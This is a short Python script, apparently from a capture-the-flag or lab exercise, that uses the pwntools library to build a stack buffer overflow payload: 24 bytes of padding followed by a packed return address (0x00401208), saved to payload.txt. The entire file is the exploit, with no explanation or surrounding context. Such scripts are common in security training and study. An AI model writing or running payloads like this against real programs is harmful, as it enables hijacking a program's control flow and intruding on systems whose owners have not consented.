import pwn

payload = b"A" * 24
payload += pwn.p64(0x00401208)

with open("payload.txt", "wb") as f:
    f.write(payload)

f.close()
